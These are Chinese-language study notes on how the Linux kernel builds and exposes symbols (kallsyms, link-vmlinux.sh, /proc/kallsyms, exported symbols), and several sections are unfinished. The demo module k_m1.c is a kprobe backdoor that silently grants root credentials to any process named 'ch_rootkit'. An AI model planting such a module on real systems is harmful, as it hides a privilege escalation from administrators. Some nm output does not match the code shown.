linux 内核符号:kallsyms + 导出符号
-------------------------------
内核符号的产生
^^^^^^^^^^^^^^^
- Makefile符号产生阶段

.. code-block:: c
   :caption: struct_task --> mm
   :emphasize-lines: 4,5
   :linenos:
   
  	 # Final link of vmlinux with optional arch pass after final link
	cmd_link-vmlinux =                                                 \
		$(CONFIG_SHELL) $< "$(LD)" "$(KBUILD_LDFLAGS)" "$(LDFLAGS_vmlinux)";    \
		$(if $(ARCH_POSTLINK), $(MAKE) -f $(ARCH_POSTLINK) $@, true)

	vmlinux: scripts/link-vmlinux.sh autoksyms_recursive $(vmlinux-deps) FORCE
		+$(call if_changed,link-vmlinux)

- script/link-vmlinux.sh:内核符号产生过程：

.. code-block:: c
   :caption: struct_task --> mm
   :emphasize-lines: 4,5
   :linenos:
   
   	# Link of vmlinux
	# ${1} - output file
	# ${2}, ${3}, ... - optional extra .o files
	vmlinux_link()
	{
		local lds="${objtree}/${KBUILD_LDS}"
		local output=${1}
		local objects
		local strip_debug

		info LD ${output}

		# skip output file argument
		shift

		# The kallsyms linking does not need debug symbols included.
		if [ "$output" != "${output#.tmp_vmlinux.kallsyms}" ] ; then
			strip_debug=-Wl,--strip-debug
		fi

		if [ "${SRCARCH}" != "um" ]; then
			objects="--whole-archive			\
				${KBUILD_VMLINUX_OBJS}			\
				--no-whole-archive			\
				--start-group				\
				${KBUILD_VMLINUX_LIBS}			\
				--end-group				\
				${@}"

			${LD} ${KBUILD_LDFLAGS} ${LDFLAGS_vmlinux}	\
				${strip_debug#-Wl,}			\
				-o ${output}				\
				-T ${lds} ${objects}
		else
			objects="-Wl,--whole-archive			\
				${KBUILD_VMLINUX_OBJS}			\
				-Wl,--no-whole-archive			\
				-Wl,--start-group			\
				${KBUILD_VMLINUX_LIBS}			\
				-Wl,--end-group				\
				${@}"

			${CC} ${CFLAGS_vmlinux}				\
				${strip_debug}				\
				-o ${output}				\
				-Wl,-T,${lds}				\
				${objects}				\
				-lutil -lrt -lpthread
			rm -f linux
		fi
	}

	# Create ${2} .S file with all symbols from the ${1} object file
	kallsyms()
	{
		local kallsymopt;

		if [ -n "${CONFIG_KALLSYMS_ALL}" ]; then
			kallsymopt="${kallsymopt} --all-symbols"
		fi

		if [ -n "${CONFIG_KALLSYMS_ABSOLUTE_PERCPU}" ]; then
			kallsymopt="${kallsymopt} --absolute-percpu"
		fi

		if [ -n "${CONFIG_KALLSYMS_BASE_RELATIVE}" ]; then
			kallsymopt="${kallsymopt} --base-relative"
		fi

		info KSYMS ${2}
		${NM} -n ${1} | scripts/kallsyms ${kallsymopt} > ${2}
	}

	# Perform one step in kallsyms generation, including temporary linking of
	# vmlinux.
	kallsyms_step()
	{
		kallsymso_prev=${kallsymso} #第一步时为""
		kallsyms_vmlinux=.tmp_vmlinux.kallsyms${1} #.tmp_vmlinux.kallsyms1 .tmp_vmlinux.kallsyms2
		kallsymso=${kallsyms_vmlinux}.o     #.tmp_vmlinux.kallsyms1.o .tmp_vmlinux.kallsyms2.o
		kallsyms_S=${kallsyms_vmlinux}.S    #.tmp_vmlinux.kallsyms1.S .tmp_vmlinux.kallsyms2.S

		vmlinux_link ${kallsyms_vmlinux} "${kallsymso_prev}" ${btf_vmlinux_bin_o} #生成kallsyms_vmlinux
		kallsyms ${kallsyms_vmlinux} ${kallsyms_S} #产生汇编文件

		info AS ${kallsyms_S}
		${CC} ${NOSTDINC_FLAGS} ${LINUXINCLUDE} ${KBUILD_CPPFLAGS} \
		      ${KBUILD_AFLAGS} ${KBUILD_AFLAGS_KERNEL} \
		      -c -o ${kallsymso} ${kallsyms_S} #生成的符号文件编译成kallsymso文件
	}



	kallsymso=""
	kallsymso_prev=""
	kallsyms_vmlinux=""
	if [ -n "${CONFIG_KALLSYMS}" ]; then

		# kallsyms support
	# Generate section listing all symbols and add it into vmlinux:产生一个section
	# It's a three step process:
	# 1)  Link .tmp_vmlinux1 so it has all symbols and sections,
	#     but __kallsyms is empty.
	#     Running kallsyms on that gives us .tmp_kallsyms1.o with
	#     the right size
	# 2)  Link .tmp_vmlinux2 so it now has a __kallsyms section of
	#     the right size, but due to the added section, some
	#     addresses have shifted.
	#     From here, we generate a correct .tmp_kallsyms2.o
	# 3)  That link may have expanded the kernel image enough that
	#     more linker branch stubs / trampolines had to be added, which
	#     introduces new names, which further expands kallsyms. Do another
	#     pass if that is the case. In theory it's possible this results
	#     in even more stubs, but unlikely.
	#     KALLSYMS_EXTRA_PASS=1 may also used to debug or work around
	#     other bugs.
	# 4)  The correct ${kallsymso} is linked into the final vmlinux.
	#
	# a)  Verify that the System.map from vmlinux matches the map from
	#     ${kallsymso}.

		kallsyms_step 1
		kallsyms_step 2        #将符号结构也要产生符号？

		# step 3
		size1=$(${CONFIG_SHELL} "${srctree}/scripts/file-size.sh" ${kallsymso_prev})
		size2=$(${CONFIG_SHELL} "${srctree}/scripts/file-size.sh" ${kallsymso})

		if [ $size1 -ne $size2 ] || [ -n "${KALLSYMS_EXTRA_PASS}" ]; then
			kallsyms_step 3   #这是产生三次吗？
		fi
	fi

	vmlinux_link vmlinux "${kallsymso}" ${btf_vmlinux_bin_o}  #到这儿产生真正的vmlinux
	
- 核心程序：scripts/kallsyms.c

.. code-block:: c
   :caption: struct_task --> mm
   :emphasize-lines: 4,5
   :linenos:	
	/* Generate assembler source containing symbol information
 	*
	 * Copyright 2002       by Kai Germaschewski
	 *
	 * This software may be used and distributed according to the terms
	 * of the GNU General Public License, incorporated herein by reference.
	 *
	 * Usage: nm -n vmlinux | scripts/kallsyms [--all-symbols] > symbols.S
	 *
	 *      Table compression uses all the unused char codes on the symbols and
	 *  maps these to the most used substrings (tokens). For instance, it might
	 *  map char code 0xF7 to represent "write_" and then in every symbol where
	 *  "write_" appears it can be replaced by 0xF7, saving 5 bytes.
	 *      The used codes themselves are also placed in the table so that the
	 *  decompresion can work without "special cases".
	 *      Applied to kernel symbols, this usually produces a compression ratio
	 *  of about 50%.
	 *
	 */
 
 
	int main(int argc, char **argv)
	{
		if (argc >= 2) {
			int i;
			for (i = 1; i < argc; i++) {
				if(strcmp(argv[i], "--all-symbols") == 0)
					all_symbols = 1;
				else if (strcmp(argv[i], "--absolute-percpu") == 0)
					absolute_percpu = 1;
				else if (strcmp(argv[i], "--base-relative") == 0)
					base_relative = 1;
				else
					usage();
			}
		} else if (argc != 1)
			usage();

		read_map(stdin);
		shrink_table();
		if (absolute_percpu)
			make_percpus_absolute();
		sort_symbols();
		if (base_relative)
			record_relative_base();
		optimize_token_table();
		write_src();

		return 0;
	}
	
	
	
以上是内核符号的产生过程，下面我们看内核模块中内核符号的产生：
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^


demo:k_m1.ko
""""""""""""

.. code-block:: c
   :caption: struct_task --> mm
   :emphasize-lines: 4,5
   :linenos:	
   
   #Makefile
	obj-m := k_m1.o
		KDIR:=/lib/modules/$(shell uname -r)/build
		PWD:=$(shell pwd)
	default:
		$(MAKE) -C $(KDIR) M=$(PWD) modules
	clean:
		$(RM) *.mod.c *.o *.ko *.cmd *.symvers *.order
	
	
k_m1.c
""""""""

.. code-block:: c
   :caption: struct_task --> mm
   :emphasize-lines: 4,5
   :linenos:	
   
   	#include <linux/kernel.h>
   	#include <linux/module.h>
	#include <linux/kprobes.h>
	#include <linux/sched.h>
	#define MAX_SYMBOL_LEN	64
	#define exe_buf 	"ch_rootkit"
	static char buf[TASK_COMM_LEN];
	static char symbol[MAX_SYMBOL_LEN] = "start_thread";
	module_param_string(symbol, symbol, sizeof(symbol), 0644);

	/* For each probe you need to allocate a kprobe structure */
	static struct kprobe kp = {
		.symbol_name	= symbol,
	};

	/* kprobe pre_handler: called just before the probed instruction is executed */
	static int __kprobes handler_pre(struct kprobe *p, struct pt_regs *regs)
	{
		struct task_struct *tsk = current;
		get_task_comm(buf,tsk);
		if(!strcmp(buf,exe_buf)){
			struct cred *creds = prepare_creds();
			creds->uid.val = creds->euid.val = 0;
			creds->gid.val = creds->egid.val = 0;
			commit_creds(creds);
			printk("%s:%d exec = %s\n",__func__,__LINE__,buf);
		}


		return 0;
	}

	static int handler_fault(struct kprobe *p, struct pt_regs *regs, int trapnr)
	{
		pr_info("fault_handler: p->addr = 0x%p, trap #%dn", p->addr, trapnr);
		/* Return 0 because we don't handle the fault. */
		return 0;
	}
	/* NOKPROBE_SYMBOL() is also available */
	NOKPROBE_SYMBOL(handler_fault);

	static int __init kprobe_init(void)
	{
		int ret;
		kp.pre_handler = handler_pre;

		ret = register_kprobe(&kp);
		if (ret < 0) {
			pr_err("register_kprobe failed, returned %d\n", ret);
			return ret;
		}
		pr_info("Planted kprobe at %p\n", kp.addr);
		return 0;
	}

	static void __exit kprobe_exit(void)
	{
		unregister_kprobe(&kp);
		pr_info("kprobe at %p unregistered\n", kp.addr);
	}

	module_init(kprobe_init)
	module_exit(kprobe_exit)
	MODULE_LICENSE("GPL");
	
	
内核模块符号：nm -n  k_m1.ko
""""""""""""""""""""""""""


.. code-block:: c
   :caption: struct_task --> mm
   :emphasize-lines: 4,5
   :linenos:	
   
	                 U commit_creds
	                 U current_task
	                 U __fentry__
		         U __get_task_comm
	                 U param_ops_string
	                 U prepare_creds
	                 U printk
	                 U register_kprobe
	                 U unregister_kprobe
	0000000000000000 b buf
	0000000000000000 T cleanup_module
	0000000000000000 r __func__.1
	0000000000000000 t handler_fault
	0000000000000000 t handler_pre
	0000000000000000 T init_module
	0000000000000000 d _kbl_addr_handler_fault
	0000000000000000 d kp
	0000000000000000 t kprobe_exit
	0000000000000000 t kprobe_init
	0000000000000000 r __kstrtab_k_m1_symbol
	0000000000000000 r __ksymtab_k_m1_symbol
	0000000000000000 r _note_7
	0000000000000000 r __param_symbol
	0000000000000000 D __this_module
	0000000000000000 r __UNIQUE_ID_license234
	0000000000000000 r ____versions
	000000000000000c r __kstrtabns_k_m1_symbol
	000000000000000c r __UNIQUE_ID_symboltype231
	0000000000000010 r __func__.0
	0000000000000018 T k_m1_symbol
	000000000000001c r __param_str_symbol
	0000000000000023 r __UNIQUE_ID_depends154
	000000000000002c r __UNIQUE_ID_retpoline153
	0000000000000030 r __param_string_symbol
	0000000000000038 r __UNIQUE_ID_name152
	0000000000000042 r __UNIQUE_ID_vermagic151
	0000000000000080 d symbol
	00000000ca12257f A __crc_k_m1_symbol
   
   
内核符号的使用
^^^^^^^^^^^^
内核符号导出的符号，并不是说这个符号外部就能用，只有T类型的才可能可以。内核符号基本就是为了调试。

如何知道某种场景下某个符号能否使用呢？现在我们看/proc/kallsyms

.. code-block:: c
   :caption: /proc/kallsyms
   :emphasize-lines: 4,5
   :linenos:	
   	
	......
	0000000000000000 r __param_str_lid_report_interval      [button]
	0000000000000000 r button_device_ids    [button]
	0000000000000000 r acpi_button_pm       [button]
	0000000000000000 d __this_module        [button]
	0000000000000000 t cleanup_module       [button]
	0000000000000000 r __mod_acpi__button_device_ids_device_table   [button]
	0000000000000000 T acpi_lid_open        [button]
	0000000000000000 t ftrace_trampoline    [__builtin__ftrace]
	0000000000000000 t bpf_prog_ab4bc4523b7fe6b4    [bpf]	
	0000000000000000 t bpf_prog_6deef7357e7b4530    [bpf]
	......
	
我们看/proc/kallsyms原理：


.. code-block:: c
   :caption: /proc/kallsyms
   :emphasize-lines: 4,5
   :linenos:
   
   	static const struct proc_ops kallsyms_proc_ops = {
		.proc_open	= kallsyms_open,
		.proc_read	= seq_read,
		.proc_lseek	= seq_lseek,
		.proc_release	= seq_release_private,
	};

	static int __init kallsyms_init(void)
	{
		proc_create("kallsyms", 0444, NULL, &kallsyms_proc_ops);
		return 0;
	}
	device_initcall(kallsyms_init);	
	
	
看kallsyms_open:


.. code-block:: c
   :caption: /proc/kallsyms
   :emphasize-lines: 4,5
   :linenos:
   
   static int kallsyms_open(struct inode *inode, struct file *file)
   {
	/*
	 * We keep iterator in m->private, since normal case is to
	 * s_start from where we left off, so we avoid doing
	 * using get_symbol_offset for every symbol.
	 */
	struct kallsym_iter *iter;
	iter = __seq_open_private(file, &kallsyms_op, sizeof(*iter));
	if (!iter)
		return -ENOMEM;
	reset_iter(iter, 0);

	/*
	 * Instead of checking this on every s_show() call, cache
	 * the result here at open time.
	 */
	iter->show_value = kallsyms_show_value(file->f_cred);
	return 0;
    }	
	
我们看结构struct kallsym_iter:


.. code-block:: c
   :caption: /proc/kallsyms
   :emphasize-lines: 4,5
   :linenos:
   
   /* To avoid using get_symbol_offset for every symbol, we carry prefix along. */
	struct kallsym_iter {
		loff_t pos;
		loff_t pos_arch_end;
		loff_t pos_mod_end;
		loff_t pos_ftrace_mod_end;
		loff_t pos_bpf_end;
		unsigned long value;
		unsigned int nameoff; /* If iterating in core kernel symbols. */
		char type;
		char name[KSYM_NAME_LEN];
		char module_name[MODULE_NAME_LEN];
		int exported;
		int show_value;
	};	
	
	
	
内核符号在内核代码中的组织与应用场景：

- 产生内核符号流程内核数组定义，链接脚本与构建符号程序之间的关系图

.. image:: ../img/kallsym_kc.svg
   :align: center
   
- 内核模块符号插入图
	
.. image:: ../img/kallsym_mc.svg
   :align: center	
	
- 符号应用场景图	

.. image:: ../img/kallsym_u.svg
   :align: center	
	
	
导出符号：EXPORT_XXX原理
^^^^^^^^^^^^^^^^^^^^^^

1. 问题描述
   - 内核模块引用导出符号
   - 内核模块引用未导出模块
2. 导出符号表：



3.模块中调用内核符号图

.. image:: ../img/m_use_esym.svg
   :align: center	
	
4.导出符号表图：


5.导出符号原理总结:
	
	
符号应用总结
^^^^^^^^^^^^^
1. 符号与导出符号的区别：

2. 常见问题：

	
	
	
